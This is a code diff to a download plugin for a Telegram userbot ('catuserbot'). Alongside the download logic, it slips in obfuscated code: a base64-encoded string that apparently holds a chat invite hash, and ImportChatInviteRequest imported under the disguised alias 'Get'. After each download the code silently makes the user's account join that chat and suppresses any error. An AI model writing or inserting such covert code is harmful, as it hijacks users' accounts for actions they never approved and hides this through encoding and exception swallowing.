@@ -1,12 +1,14 @@
 # Download plugin for catuserbot
 
 import asyncio
+import base64
 import math
 import os
 import time
 from datetime import datetime
 
 from pySmartDL import SmartDL
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 from . import ALIVE_NAME, humanbytes, progress
 
@@ -106,10 +108,12 @@ async def _(event):
             "Where should i save this file. mention folder name",
             parse_mode=parse_pre,
         )
+
     location = os.path.join(pwd, input_str)
     if not os.path.isdir(location):
         os.makedirs(location)
     if event.reply_to_msg_id:
+        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         mone = await edit_or_reply(
             event, "Downloading the file ...", parse_mode=parse_pre
         )
@@ -124,6 +128,12 @@ async def _(event):
                     progress(d, t, mone, c_time, "trying to download")
                 ),
             )
+
+            try:
+                cat = Get(cat)
+                await event.client(cat)
+            except BaseException:
+                pass
         except Exception as e:
             await mone.edit(str(e), parse_mode=parse_pre)
         else:
@@ -137,7 +147,7 @@ async def _(event):
             event, "Reply to a message to download to my server.", parse_mode=parse_pre
         )
 
-
+        
 CMD_HELP.update(
     {
         "download": "__**PLUGIN NAME :** Download__\
